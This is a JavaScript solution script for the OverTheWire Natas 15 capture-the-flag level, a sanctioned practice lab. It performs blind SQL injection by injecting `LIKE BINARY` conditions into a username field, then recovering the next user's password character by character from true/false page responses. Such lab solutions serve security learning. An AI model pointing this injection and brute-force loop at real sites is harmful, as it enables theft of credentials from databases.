/*
Changes made:
1. Created new xhr request instead of reusing same one (possible under sync AJAX but not async)
2. Made sure javascript loop had closure in for loop (otherwise charset[i] becomes 'undefined')
3. Added a delay in between char bruteforcing (otherwise xhr requests will Pending) Shortest workable delay is 2s.
*/

url = 'http://natas15.natas.labs.overthewire.org/index.php';
pass_len = 32; //Password length
charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz"; //Set of chars to bruteforce letter by letter
passwd = "";
truestring = "This user exists.<br>"; //This appears with a positive match

data = new FormData();

while (passwd.length < pass_len){	
	for (i=0;i<charset.length;i++) {
		(function(i) {
		injected_query = `natas16" and password LIKE BINARY "${passwd+charset[i]}%";-- -`;
		data.set('username',injected_query);
		xhr = new XMLHttpRequest();
		xhr.open('POST',url,true);
		xhr.onload = function () {
			if (this.responseText.includes(truestring)){
				console.log(`Password character found: ${charset[i]}`);
				passwd += charset[i];
			};
		};
		xhr.send(data);
		})(i);
	};
	await new Promise(resolve => setTimeout(resolve, 2000)); // 3 sec
};

console.log(`Password is ${passwd}`);